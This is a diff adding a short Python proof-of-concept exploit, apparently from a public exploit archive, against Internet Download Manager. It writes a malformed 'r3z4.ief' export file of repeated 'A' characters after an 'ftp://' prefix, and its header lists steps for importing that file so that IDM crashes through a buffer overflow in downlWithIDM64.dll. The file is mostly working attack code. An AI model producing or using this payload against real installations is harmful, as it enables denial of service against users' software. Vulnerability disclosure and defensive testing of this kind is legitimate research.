@@ -1,0 +1,32 @@
+#!/usr/bin/env python
+# Title : Internet Download Manager - Crash Proof Of Concept
+# Affected Versions: All Version
+# Founder : InternetDownloadManager
+# Tested on Windows 7 / Server 2008
+#
+#
+# Author      :   Mohammad Reza Espargham
+# Linkedin    :   https://ir.linkedin.com/in/rezasp
+# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
+# Website     :   www.reza.es
+# Twitter     :   https://twitter.com/rezesp
+# FaceBook    :   https://www.facebook.com/mohammadreza.espargham
+#
+#
+# downlWithIDM64.dll Exploit
+#
+#
+# 1 . run python code : python crash.py
+# 2 . open "IDM"
+# 3 . Tasks --> Import --> From IDM export file
+# 4 . select r3z4.ief
+# 5 . Crashed ;)
+
+
+hdr = "<" #start syntax
+hcr = "ftp://" #pro
+crash = "\x41"*1992999 #B0F
+exp = hdr+hcr+crash+hdr+hcr+crash
+file = open("r3z4.ief", "w")
+file.write(exp)
+file.close()
